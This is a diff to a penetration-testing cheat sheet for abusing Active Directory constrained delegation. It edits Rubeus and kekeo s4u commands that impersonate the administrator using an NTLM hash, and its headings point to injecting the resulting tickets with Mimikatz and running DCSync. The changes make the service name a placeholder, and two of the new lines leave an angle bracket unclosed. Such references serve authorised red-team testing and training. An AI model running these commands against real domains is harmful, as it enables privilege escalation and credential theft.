@@ -292,7 +292,7 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 #### Rubeus request and inject TGT + TGS
 - Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
-.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
+.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
 
 #### Requesting TGT with kekeo
@@ -303,7 +303,7 @@ Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
 
 #### Requesting TGS with kekeo
 ```
-Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
+Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
 ```
 
 #### Use Mimikatz to inject the TGS ticket
@@ -327,7 +327,7 @@ Tgt::ask /user:dcorp-adminsrv$ /domain:<DOMAIN> /rc4:<HAHS>
 #### Requesting TGS
 No validation for the SPN specified
 ```
-Tgs::s4u /tgt:<kirbi file> /user:Administrator@<DOMAIN> /service:time/<MACHINE NAME>|ldap/<MACHINE NAME>
+Tgs::s4u /tgt:<kirbi file> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
